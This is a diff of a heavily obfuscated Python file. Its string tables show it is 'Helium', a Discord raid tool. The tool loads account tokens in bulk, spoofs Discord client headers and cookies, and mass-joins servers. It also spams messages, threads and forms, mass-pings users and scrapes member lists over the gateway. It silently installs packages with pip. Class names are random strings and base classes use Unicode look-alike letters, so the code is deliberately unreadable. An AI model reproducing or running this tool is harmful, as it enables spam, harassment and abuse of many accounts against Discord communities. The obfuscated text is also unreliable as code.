+class NtxjCz8PAlX7nOYFvfHl1luBjhiGAiUC(𝗡𝙇𝘸𝙣𝙀𝘣𝘬𝙩𝘲𝘣𝙌𝗭𝙡𝘱𝗲𝗚𝘉𝗴𝗼𝗯2𝗜𝗠𝙌𝗵𝘤𝗶𝘬𝘝8𝘞𝘍):...
 
-class J3ufraMCzia9Dl9SMUMYG6eSgTQ4vcua(𝗢𝗤𝗼𝙨𝘳𝙕𝗞𝗼𝗵𝙖𝘟𝘢_𝘤𝙓𝘁𝙢𝗰𝙓𝙄𝘘𝙁𝙒𝘲_𝙊9𝙉𝗭𝘉𝙔𝙉):...
+class eudRIfytw0VJ3DnLRjJHyrrQqyrzTJmu(𝘺𝗲𝙧𝘶𝗨𝙟𝘒𝙞𝘍3𝘔4𝗧𝙯𝘯𝗸𝙗𝘨𝘙𝗢𝘓9𝘅𝗵𝙄9𝘶𝗧𝘠𝘐4𝗵):...
 
-class KDJoDC1PYHjPH0lAmAa4jd54vmXlwbVx(𝘛𝙢𝗢7𝙫𝗪𝙝𝙁𝗤𝘑𝙥𝘴𝙌𝘵𝘹𝙔𝘣𝙄𝗫𝘣𝗦𝗠𝘫𝘥𝙒𝗺𝘺𝘈𝘣2𝘺𝙍):...
+class COexj45uAtjnhrmkvigjhLetY9FvQh8C(𝗞𝙡𝘙6𝙑𝙯𝙄𝘺𝙉𝘼𝘮42𝗲66𝘻𝗭1𝙎𝗚3𝙐6𝗤𝗫𝘀𝗠𝗲𝙀𝗶𝘅):...
 
-class SH6kVjuOeWKf1zfZ3sr7z6KXrp3NQOWu(𝙎𝗡𝗸𝙩𝘔𝘚𝙡𝘾𝙮𝘳𝘟𝗶𝘠𝘯𝗜𝙛𝗣𝙒𝗨𝘆𝗲𝙥6𝗩𝘫𝗵4𝘌2𝙃𝙒𝙘):...
+class sg_D_mEcLwtd3yeNKRX2hyWbWjoul0J0(𝘿𝗤𝗶𝗣𝘖𝘒𝙢9𝘂9𝙃𝙩𝗮𝘓𝙘𝘷𝘅𝙢𝘜𝘻𝙓_𝘲𝘆𝘚𝘣𝙁𝗜6𝙘𝘛𝙅):...
 
-class yo_4nqf6ZtwC9Xj0B7xKjndvR8aWKZ7a(𝗶𝘬𝘢𝙒𝘩𝘃𝙛𝙙𝘆𝙪7𝘷𝙂𝘭𝙗𝘌𝗺𝙜𝘘𝘢𝘦𝗛𝘵𝗙𝘐𝗝_𝘾𝙞𝙧𝗧6):...
+class jg27dV6Tk36WVyFRruCXpoe9LISAXs1i(𝗲𝗼𝘳𝗟𝙨𝙖𝘄𝘊𝙉𝙒𝘋𝘒4𝘔𝘙𝘪4𝙨𝗖𝗔𝙍𝗤𝗹6𝘟𝘹𝘕𝙅𝗘2𝗿𝘮):...
 
-class noSL5OV8kIjHs38UuJfRMzkPLU1bii9A(𝘘𝗠𝘄𝗤𝘽𝙂𝙨447𝘞𝘅𝗨4𝘍𝘆𝙟𝘤𝗚𝘾𝗙𝙃4𝙥𝘿𝘾𝘎𝗚𝘇𝗶3𝗥):...
+class pjxy6VIVwIYEtRc8KELzmjitbLOL2YYZ(𝘞𝘋𝘶𝗡𝘴𝙥𝘽𝘀𝙘𝘑𝘸𝙛𝗠𝘽𝗞𝙗𝘊𝗜𝙍𝗤𝗼𝘱60𝙟7𝘼𝙧𝘡𝘧𝘒𝗛):...
 
-class KuXTdCEqQ0uJTplcwilonaxzxVBhOCap(𝘱𝗹𝘝𝗧𝗠52𝘐𝙒𝘥𝘜1𝙫𝘰𝘔9𝘝𝘋𝘿𝙏𝗣𝙦𝙎𝗲𝙖𝙤𝘵𝘶𝘒𝗖𝗸1):...
+class am2HL3S7YmH6UaUtWrrHS1WEgJB3C1OB(𝗿𝙅𝘫𝙑𝘴𝘡𝗷𝙡1𝗟3𝗞𝘫𝙢𝙨𝙛𝙚𝙪𝗘𝙥𝙜2𝙯4𝙢𝙀𝘒𝙞𝘜𝘹𝘠𝘕):...
 
-class kvOKbKO1ms3KBDNpU55wieyLrCKmIwaD(𝙆𝘋𝗝𝗼𝘿𝘾1𝘗𝙔𝘏𝗷𝙋𝘏0𝘭𝘈𝙢𝘈𝘢4𝘫𝗱54𝘃𝘮𝘟𝙡𝙬𝙗𝘝𝘅):...
+class jFpOvI3IxWidlsvupWsAdBArRJVB2fAx(𝗿_𝙛4𝘩𝙜𝙩𝙦𝘇𝗾𝙆401𝗬3𝙩𝘩𝘜𝘕7𝙑𝗭𝘤𝘳5𝗫0𝙓𝗧𝙍𝙚):...
 
-class xjt4lW09KyZ6GqxZGTlO2_sH0yNpjsRG(𝗦𝘏6𝘬𝗩𝘫𝘶𝗢𝙚𝘞𝘒𝙛1𝘇𝙛𝘡3𝘀𝙧7𝙯6𝘒𝗫𝘳𝘱3𝘕𝙌𝗢𝙒𝘂):...
+class WYIFt0bygAeULxGRpIJuhmf8wT8Q98OR(𝘦𝘶𝗱𝘙𝙄𝙛𝙮𝘵𝘸0𝗩𝗝3𝘋𝙣𝗟𝘙𝙟𝗝𝗛𝘆𝙧𝙧𝙌𝙦𝘺𝗿𝘇𝙏𝘑𝙢𝘂):...
 
-class _I1EVCLECxmTNK9JiaQ4pBkM7U42YLj5(𝘺𝗼_4𝘯𝙦𝙛6𝘡𝘵𝘸𝘊9𝘟𝗷0𝗕7𝙭𝗞𝙟𝙣𝗱𝘷𝙍8𝗮𝗪𝗞𝗭7𝘢):...
+class _MWuXh0pCsaHP2BGJ6copKRhBkc35K5D(𝘊𝘖𝗲𝙭𝘫45𝘶𝘈𝙩𝗷𝘯𝙝𝙧𝙢𝙠𝙫𝘪𝙜𝘫𝘩𝘓𝗲𝘁𝙔9𝘍𝙫𝘘𝙝8𝘊):...
 
-class I8P3h0SwRS7gGaUDUaOrfPLc8UkPLFNm(𝘒𝙪𝙓𝘛𝙙𝘾𝗘𝘲𝗤0𝙪𝗝𝘛𝘱𝙡𝗰𝘄𝘪𝘭𝗼𝙣𝙖𝙭𝘇𝘹𝗩𝘉𝙝𝘖𝘾𝘢𝙥):...
+class zX9GEfPwzgUVQv5xOkoy7xTxzRbhLu_I(𝙨𝙜_𝘋_𝘮𝘌𝘤𝗟𝘸𝘁𝙙3𝘺𝙚𝘕𝙆𝙍𝙓2𝗵𝘆𝗪𝙗𝗪𝗷𝙤𝘂𝙡0𝙅0):...
 
-class _dfGyMZBFD0cbvTpGlWUApormbiaWztU(𝗸𝙫𝘖𝘒𝗯𝗞𝗢1𝗺𝘀3𝙆𝗕𝘿𝙉𝘱𝙐55𝘸𝗶𝘦𝘆𝙇𝙧𝘾𝗞𝗺𝙄𝙬𝘢𝘋):...
+class w37d6m66wQm_QfSBUNu_L1FazBCuJhNF(𝗷𝙜27𝗱𝙑6𝗧𝘬36𝘞𝘝𝘆𝗙𝙍𝘳𝙪𝗖𝙓𝙥𝙤𝘦9𝘓𝗜𝘚𝘈𝗫𝘀1𝙞):...
 
-class ccjock2czEGiQGo2ziljqjY5w0K2eTJx(𝘅𝘫𝘵4𝙡𝘞09𝙆𝘆𝗭6𝗚𝗾𝘹𝙕𝗚𝘛𝗹𝗢2_𝙨𝗛0𝘺𝘕𝗽𝗷𝘀𝙍𝘎):...
+class mMQBQtWPkkWO1QWETIDwXxujyKt_HLDu(𝘱𝘫𝘹𝙮6𝙑𝘐𝘝𝘄𝗜𝗬𝙀𝘵𝗥𝘤8𝙆𝙀𝘓𝘻𝙢𝙟𝘪𝙩𝘣𝗟𝙊𝙇2𝘠𝙔𝗭):...
 
-class LG2k93L16idshQbvBcycC43eU4m9EBbv(_𝙄1𝘌𝙑𝘾𝙇𝙀𝘾𝘅𝘮𝗧𝗡𝙆9𝗝𝘪𝙖𝙌4𝘱𝘉𝘬𝙈7𝘜42𝘠𝘓𝘫5):...
+class zG3a0WKQqZsrw3nYQQUm2uTmMlfjXMV3(𝗮𝙢2𝙃𝙇3𝗦7𝗬𝘮𝗛6𝘜𝗮𝗨𝙩𝘞𝗿𝙧𝗛𝘚1𝘞𝗘𝙜𝘑𝘽3𝗖1𝘖𝗕):...
 
-class wj5Zhu8kUa0TZ8dXXOBT4rNkUy9hyBfs(𝙄8𝙋3𝘩0𝘚𝙬𝘙𝗦7𝘨𝗚𝗮𝗨𝘋𝘜𝙖𝘖𝙧𝗳𝗣𝗟𝘤8𝗨𝘬𝘗𝘓𝗙𝙉𝘮):...
+class K6lEsSuqMgMKDxIOVgFthEGRqYK5OPNw(𝙟𝗙𝘱𝙊𝙫𝗜3𝘐𝘅𝗪𝘪𝘥𝗹𝘀𝘷𝘂𝙥𝙒𝘀𝘼𝙙𝘽𝗔𝗿𝙍𝙅𝘝𝘽2𝘧𝗔𝘅):...
 
-class Orwa2mqg2Oe2wiMQTHntqxpZ957cR8kH(_𝗱𝗳𝘎𝙮𝙈𝙕𝗕𝙁𝗗0𝙘𝘣𝘃𝗧𝗽𝗚𝙡𝘞𝘜𝘈𝘱𝘰𝗿𝘮𝙗𝙞𝘢𝙒𝙯𝙩𝘜):...
+class j3G66jVhLmVJiBRcxElacbNRNQuxDL4n(𝙒𝗬𝙄𝗙𝙩0𝘣𝘆𝗴𝘼𝘦𝙐𝘓𝘹𝙂𝗥𝙥𝘐𝙅𝘂𝗵𝙢𝗳8𝙬𝗧8𝘘98𝗢𝗥):...
 
-class hqQWLQctvSLkOAVrOtaCZCDbCVhSuXFi(𝘤𝗰𝗷𝗼𝗰𝙠2𝙘𝘻𝙀𝙂𝙞𝘘𝗚𝗼2𝘻𝗶𝘭𝘫𝘲𝘫𝗬5𝘄0𝙆2𝙚𝘛𝗝𝙭):...
+class ybUfOcL39DuOnf_uQtEabTmVcTyMk08w(_𝙈𝙒𝘂𝗫𝙝0𝗽𝘊𝘀𝘢𝗛𝗣2𝗕𝗚𝘑6𝘤𝘰𝗽𝗞𝙍𝙝𝗕𝗸𝙘35𝗞5𝘋):...
 
-class m6AZwiH4RI2Lgdw_DusHolYeCrS6fuMe(𝙇𝘎2𝙠93𝗟16𝘪𝘥𝙨𝗵𝗤𝘣𝘷𝘽𝗰𝘺𝘤𝘊43𝙚𝘜4𝗺9𝘌𝘽𝙗𝘷):...
+class b4IsOhgA_o_KpbTWt_fWtDKnGW2XdeWd(𝙯𝙓9𝘎𝗘𝙛𝘗𝙬𝘻𝗴𝗨𝘝𝙌𝘷5𝙭𝗢𝘬𝘰𝙮7𝘅𝙏𝙭𝘇𝙍𝗯𝙝𝘓𝙪_𝘐):...
 
-class RuvtwXLy_QrQ20VF633IJExCElhkoXiG(𝘸𝘫5𝘡𝗵𝘶8𝗸𝘜𝗮0𝙏𝗭8𝘥𝙓𝙓𝘖𝘉𝙏4𝘳𝙉𝙠𝙐𝘺9𝘩𝘆𝘉𝙛𝘴):...
+class F8svkQR24S3nqH6RXJTWvU7Su47OIjun(𝗺𝗠𝘘𝘽𝗤𝘵𝙒𝗣𝙠𝙠𝘞𝗢1𝗤𝗪𝘌𝗧𝘐𝘿𝙬𝘟𝘅𝘂𝘫𝘆𝙆𝘁_𝗛𝙇𝘿𝘶):...
 
-class NYk7ryryjGXoOtcWbueuEu2trdGMkdjC(𝘖𝗿𝘸𝗮2𝙢𝗾𝗴2𝘖𝗲2𝘸𝘪𝗠𝗤𝙏𝗛𝗻𝘵𝘲𝘹𝗽𝙕957𝙘𝘙8𝙠𝘏):...
-𝗡𝘔𝙈𝙈𝘕𝗹𝘭𝘔𝘔𝘭𝗠𝘔𝙉𝗹𝙄𝗠𝘐𝙄𝙉𝙈𝙄𝙄𝘔𝙄𝙡𝗜𝗡𝘐𝗠𝘐𝙄𝘔 = ['title Helium - starting up', 'cls', 'requests', 'base64', 'colorama', 'numpy', 'websocket', 'websocket-client', 'threading', 'pathlib', 'os.path', 'uuid', 'sys', 'hashlib', 'datetime', 'tls_client', 'time', 'subprocess', 'emoji', 'title Helium - First Time Install', 'Installing dependencies... (', '/18)', 'pip install ', ' > nul', 'Finishing up...', 'data', 'avatars', 'tokens.txt', 'w', '', 'proxies.txt', 'members.txt', 'config.json', '{"proxy": false, "rgb": [255, 130, 0]}', 'utf8', 'proxies', 'data/proxies.txt', 'r', 'chrome_116', '     \n                                  ██', '╗  ', '██', '╗', '███████', '╗     ', '╗   ', '███', '╗\n                                  ', '║  ', '║', '╔════╝', '║     ', '║   ', '████', '╗ ', '\n                                  ███████', '█████', '╔', '\n                                  ██', '╔══', '╔══╝  ', '║╚', '╔╝', '██████', '║ ╚═╝ ', '║\n                                  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', 'data/tokens.txt', '╚', '╝', '═', '\n', '██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗', '██║  ██║██╔════╝██║     ██║██║   ██║████╗ ████║', '███████║█████╗  ██║     ██║██║   ██║██╔████╔██║', '██╔══██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║', '██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║', '╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', '\n\n', '                      ', ' Loaded ‹', '› tokens | Loaded ‹', '> proxies', '»', '«', '─', '╭', '│', '╰', '╯', '╮', '╭─────────────────────────────────────────────────────────────────────────────────────────────╮', '│ «01» Joiner            «06» Token Formatter    «11» Onliner          «16» ???               │', '│ «02» Leaver            «07» Button Click       «12» Voice Joiner     «17» ???               │', '│ «03» Spammer           «08» Accept Rules       «13» Change Nick      «18» ???               │', '│ «04» Token Checker     «09» Guild Check        «14» Thread Spammer   «19» ???               │', '│ «05» Reactor           «10» Bio Changer        «15» Forms Spammer    «20» Exit              │', '╰─────────────────────────────────────────────────────────────────────────────────────────────╯', 'title Helium', '[', '%H:%M:%S', '] ', ' (', ')', '? ', '(y/n)', ' ', ']: ', 'https://discord.com', '; ', '=', '__dcfduid=5e271e90481111eea67b61f9ac35724f; __sdcfduid=5e271e91481111eea67b61f9ac35724fbc3b6eb338d8f68fc5c82cf05c36e65b4ab6e19dd28c901f1e5e6236f69238a5; __cfruid=376f640a0e40236d1f38bc93ea51e6f430ae37e8-1693494992; _cfuvid=nQDMUQwYTyGceEcJFREhptuDgpRwpQYaeQ7UXlggUto-1693494992639-0-604800000', '(ERR): ', ' (get_discord_cookies)', 'os', 'browser', 'release_channel', 'client_version', 'os_version', 'os_arch', 'system_locale', 'browser_user_agent', 'browser_version', 'client_build_number', 'native_build_number', 'client_event_source', 'Windows', 'Discord Client', 'stable', '1.0.9017', '10.0.19045', 'x64', 'en', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chromium/108.0.5359.215 Electron/22.3.12', '22.3.12', 'authority', 'accept', 'accept-language', 'authorization', 'cookie', 'content-type', 'user-agent', 'x-discord-locale', 'x-super-properties', 'discord.com', '*/*', 'application/json', 'en-US', 'title Helium - Joiner', 'session_id', 'https://discord.com/api/v9/invites/', 'JOINED', ' (.gg/', 'CAPTCHA', 'RATELIMITED', 'FAILED', 'message', 'ERROR', ' (joiner)', 'title Helium - Leaver', 'https://discord.com/api/v9/guilds/', 'name', 'lurking', 'https://discord.com/api/v9/users/@me/guilds/', 'LEFT', ']', 'online_count', 'member_count', 'id', 'guild_id', 'hoisted_roles', 'types', 'locations', 'updates', 'd', 'groups', 'ops', 'op', 'SYNC', 'INVALIDATE', 'range', 'items', 'INSERT', 'UPDATE', 'DELETE', 'index', 'item', 'Accept-Encoding', 'Accept-Language', 'Cache-Control', 'Pragma', 'Sec-WebSocket-Extensions', 'User-Agent', 'gzip, deflate, br', 'en-US,en;q=0.9', 'no-cache', 'permessage-deflate; client_max_window_bits', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'wss://gateway.discord.gg/?encoding=json&v=9', '{"op":14,"d":{"guild_id":"', '","typing":true,"activities":true,"threads":true,"channels":{"', '":', '}}}', '{"op":2,"d":{"token":"', '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","browser_version":"116.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}', '{"op":1,"d":', '}', 'heartbeat_interval', 't', 'READY', 'guilds', 'READY_SUPPLEMENTAL', 'GUILD_MEMBER_LIST_UPDATE', 'member', 'tag', 'user', 'username', '#', 'discriminator', 'bot', 'data/members.txt', 'w+', 'no valid tokens in guild', 'a+', ' -  || <@!', '> |||| <@!', '> ||', 'Authorization', 'content-length', 'origin', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'x-debug-options', 'x-discord-timezone', 'pl', '0', '__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __stripe_mid=95b0994a-5555-4ae2-a529-19de05e8a84261fc41; cf_clearance=ipf6ofbR8N9QZhQ1Oo0kyIrHeAY3IaG.fFDwKzznKCI-1694246626-0-1-a544f47e.ac16d7c4.fcbd86dd-0.2.1694246626; __cfruid=af646639dffe9110a3a9de9f0e1ebd2752a01153-1694278928; __stripe_sid=e54ed780-00b5-44d5-a066-1ea1092a1644ec258f', '"Not?A_Brand";v="8", "Chromium";v="108"', '?0', '"Windows"', 'empty', 'cors', 'same-origin', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9017 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36', 'bugReporterEnabled', 'Europe/Warsaw', 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMjYyMjAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM2NDQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==', 'https://canary.discordapp.com/api/v9/users/@me/library', 'http', 'https', 'http://', '.', 'Valid', '**', 'Locked', 'Invalid', 'wss://gateway.discord.gg/?v=9&encoding=json', 'token', 'properties', '$os', '$browser', '$device', 'windows', 'Discord', 'desktop', 'channel_id', 'self_mute', 'self_deaf', 'Joined', 'content', 'https://discord.com/api/v9/channels/', '/messages', 'Sent', 'Fail', '** ', 'online', 'idle', 'dnd', 'wss://gateway.discord.gg/?v=6&encording=json', 'capabilities', 'presence', 'compress', 'client_state', 'device', 'referrer', 'referring_domain', 'referrer_current', 'referring_domain_current', 'Chrome', 'en-GB', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', '90.0.4430.212', '10', '85108', 'null', 'status', 'since', 'activities', 'afk', 'guild_hashes', 'highest_last_message_id', 'read_state_version', 'user_guild_settings_version', 'bio', 'https://discord.com/api/v9/users/@me/profile', 'Success', 'Failure', 'nick', '/members/@me', 'type', 'auto_archive_duration', 'location', 'Thread Browser Toolbar', '/threads', 'applied_tags', '/threads?use_nested_fields=true', '/member-verification?with_guild=false', '/requests/@me', 'Failed', '/', '/messages/', '/reactions/', '/@me?location=Message', 'Reacted', 'avatars/', 'rb+', 'avatar', 'data:image/png;base64,', 'utf-8', 'https://discord.com/api/v9/users/@me', 'limit', 'around', '50', 'components', 'nonce', 'message_flags', 'message_id', 'application_id', 'author', 'component_type', 'custom_id', 'https://discord.com/api/v9/interactions', '1', '2', '3', '4', '5', '6', '7', '8', '9', '11', '12', '13', '14', '15', '16', '20', '    ', '>', '\nPress any key to go back to the main menu...', 'pause > nul', 'title Helium - avatar changer', 'title Helium - formater', ':', '+', '] Formatted ', ' tokens', 'Message Link', '] → ', "If there's 1 button, type: (", '), if you want to click second button just type 1 or more.', 'Button Option', "If there's 1 reaction, type: (", '), if reaction is the second reaction just type 1 or more.', 'Reaction', 'title Helium - Forms Spammer', 'Channel ID', 'Thread Name', 'Message', 'title Helium - Thread spammer', 'Thread name', 'title Helium - Nickname Changer', 'Guild ID', 'Nick', 'title Helium - Check Guild', 'INVITE: ', 'Joining Delay', 'https://', 'title Helium - Accept rules', 'Server ID: ', 'title Helium - VC Joiner', 'title Helium - Bio Changer', 'Bio', 'GUILD ID', 'title Helium - Token Checker', 'title Helium - Onliner', 'Onliner', '] All tokens are online', 'title Helium - Spammer', 'Mass-Ping?', ' → ', '→ ', 'Delay', 'y', 'Pings Count', 'Scraping Members', '(it might take a while)', 'n', 'title Helium - exit', '__main__']
+class kxtUSnoZJnXVJ3oIKNCYBOLBx7gMKWUp(𝘇𝘎3𝘢0𝙒𝗞𝙌𝙦𝙕𝘀𝙧𝘸3𝗻𝗬𝘘𝙌𝘜𝘮2𝙪𝙏𝘮𝘔𝗹𝙛𝙟𝘟𝗠𝙑3):...
+
+class A2gVG4_4wvWFgXqeo_GIgRTZdEiD7sAW(𝘒6𝗹𝗘𝘴𝗦𝘂𝗾𝘔𝗴𝘔𝘒𝘋𝙭𝙄𝗢𝗩𝘨𝘍𝘁𝙝𝗘𝗚𝗥𝗾𝗬𝙆5𝙊𝗣𝘕𝙬):...
+
+class wuC8bzn9lq9CKBEPKlokTYI9DD1SeNfh(𝙟3𝗚66𝘫𝘝𝗵𝘓𝘮𝘝𝗝𝙞𝘽𝗥𝘤𝘅𝗘𝙡𝘢𝗰𝗯𝙉𝙍𝘕𝘘𝘂𝘅𝘿𝗟4𝗻):...
+
+class qU4IZNkJpeABZdEuZ0UjzkiTndlFszwf(𝙗4𝘐𝘴𝙊𝙝𝘨𝘈_𝗼_𝙆𝗽𝘣𝗧𝘞𝙩_𝙛𝙒𝙩𝘋𝘒𝘯𝙂𝗪2𝙓𝘥𝗲𝘞𝘥):...
+
+class SowE5JS3pDJGMlKcZgh7YzohU4W_qGIN(𝗸𝘹𝘵𝘜𝙎𝗻𝘰𝗭𝗝𝘯𝙓𝘝𝘑3𝗼𝗜𝙆𝗡𝘾𝙔𝘽𝙊𝙇𝘽𝘹7𝗴𝘔𝙆𝗪𝙐𝘱):...
+
+class Nt1cC4KA3XBPzGY62WRKnEiEhzriN2nr(𝘼2𝙜𝙑𝘎4_4𝘸𝙫𝙒𝘍𝙜𝘟𝗾𝗲𝙤_𝗚𝘐𝘨𝙍𝙏𝘡𝙙𝙀𝙞𝘋7𝘴𝘈𝙒):...
+
+class BD0h8R01U3Uzg9S_zBJAtiwU0ZAg2usD(𝘲𝙐4𝘐𝘡𝙉𝘬𝙅𝘱𝙚𝘈𝘉𝙕𝙙𝗘𝘶𝘡0𝘜𝗷𝘇𝗸𝘪𝘛𝙣𝙙𝙡𝘍𝘴𝘇𝙬𝗳):...
+𝗜𝙉𝙄𝙉𝙡𝙡𝙄𝗠𝙄𝙄𝘭𝗠𝗹𝗹𝘐𝘭𝗹𝙉𝙉𝙄𝗹𝙡𝗠𝙉𝗹𝗡𝘭𝙈𝘐𝗠𝘐𝗠 = ['title Helium - starting up', 'cls', 'pip install colorama > nul', 'pip install os.path > nul', 'pip install pathlib > nul', 'pip install threading > nul', 'pip install websocket > nul', 'pip install websocket_client > nul', 'pip install tls_client > nul', 'pip install requests > nul', 'pip install datetime > nul', 'pip install emoji > nul', 'pip install base64 > nul', 'pip install uuid > nul', 'pip install time > nul', 'pip install subprocess > nul', 'pip install hashlib > nul', 'data', 'avatars', 'title Helium - First Time Install', 'tokens.txt', 'w', '', 'proxies.txt', 'members.txt', 'config.json', '{"proxy": false, "rgb": [255, 130, 0]}', 'utf8', 'proxies', 'data/proxies.txt', 'r', 'chrome_116', '     \n                                  ██', '╗  ', '██', '╗', '███████', '╗     ', '╗   ', '███', '╗\n                                  ', '║  ', '║', '╔════╝', '║     ', '║   ', '████', '╗ ', '\n                                  ███████', '█████', '╔', '\n                                  ██', '╔══', '╔══╝  ', '║╚', '╔╝', '██████', '║ ╚═╝ ', '║\n                                  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', 'data/tokens.txt', '╚', '╝', '═', '\n', '██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗', '██║  ██║██╔════╝██║     ██║██║   ██║████╗ ████║', '███████║█████╗  ██║     ██║██║   ██║██╔████╔██║', '██╔══██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║', '██║  ██║███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║', '╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝', '\n\n', '                      ', ' Loaded ‹', '› tokens | Loaded ‹', '> proxies', '»', '«', '─', '╭', '│', '╰', '╯', '╮', '╭─────────────────────────────────────────────────────────────────────────────────────────────╮', '│ «01» Joiner            «06» Token Formatter    «11» Onliner          «16» ???               │', '│ «02» Leaver            «07» Button Click       «12» Voice Joiner     «17» ???               │', '│ «03» Spammer           «08» Accept Rules       «13» Change Nick      «18» ???               │', '│ «04» Token Checker     «09» Guild Check        «14» Thread Spammer   «19» ???               │', '│ «05» Reactor           «10» Bio Changer        «15» Forms Spammer    «20» Exit              │', '╰─────────────────────────────────────────────────────────────────────────────────────────────╯', 'title Helium', '[', '%H:%M:%S', '] ', ' (', ')', '? ', '(y/n)', ' ', ']: ', 'https://discord.com', '; ', '=', '__dcfduid=5e271e90481111eea67b61f9ac35724f; __sdcfduid=5e271e91481111eea67b61f9ac35724fbc3b6eb338d8f68fc5c82cf05c36e65b4ab6e19dd28c901f1e5e6236f69238a5; __cfruid=376f640a0e40236d1f38bc93ea51e6f430ae37e8-1693494992; _cfuvid=nQDMUQwYTyGceEcJFREhptuDgpRwpQYaeQ7UXlggUto-1693494992639-0-604800000', '(ERR): ', ' (get_discord_cookies)', 'os', 'browser', 'release_channel', 'client_version', 'os_version', 'os_arch', 'system_locale', 'browser_user_agent', 'browser_version', 'client_build_number', 'native_build_number', 'client_event_source', 'Windows', 'Discord Client', 'stable', '1.0.9017', '10.0.19045', 'x64', 'en', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chromium/108.0.5359.215 Electron/22.3.12', '22.3.12', 'authority', 'accept', 'accept-language', 'authorization', 'cookie', 'content-type', 'user-agent', 'x-discord-locale', 'x-super-properties', 'discord.com', '*/*', 'application/json', 'en-US', 'title Helium - Joiner', 'session_id', 'https://discord.com/api/v9/invites/', 'JOINED', ' (.gg/', 'CAPTCHA', 'RATELIMITED', 'FAILED', 'message', 'ERROR', ' (joiner)', 'title Helium - Leaver', 'https://discord.com/api/v9/guilds/', 'name', 'lurking', 'https://discord.com/api/v9/users/@me/guilds/', 'LEFT', ']', 'online_count', 'member_count', 'id', 'guild_id', 'hoisted_roles', 'types', 'locations', 'updates', 'd', 'groups', 'ops', 'op', 'SYNC', 'INVALIDATE', 'range', 'items', 'INSERT', 'UPDATE', 'DELETE', 'index', 'item', 'Accept-Encoding', 'Accept-Language', 'Cache-Control', 'Pragma', 'Sec-WebSocket-Extensions', 'User-Agent', 'gzip, deflate, br', 'en-US,en;q=0.9', 'no-cache', 'permessage-deflate; client_max_window_bits', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0', 'wss://gateway.discord.gg/?encoding=json&v=9', '{"op":14,"d":{"guild_id":"', '","typing":true,"activities":true,"threads":true,"channels":{"', '":', '}}}', '{"op":2,"d":{"token":"', '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","browser_version":"116.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}', '{"op":1,"d":', '}', 'heartbeat_interval', 't', 'READY', 'guilds', 'READY_SUPPLEMENTAL', 'GUILD_MEMBER_LIST_UPDATE', 'member', 'tag', 'user', 'username', '#', 'discriminator', 'bot', 'data/members.txt', 'w+', 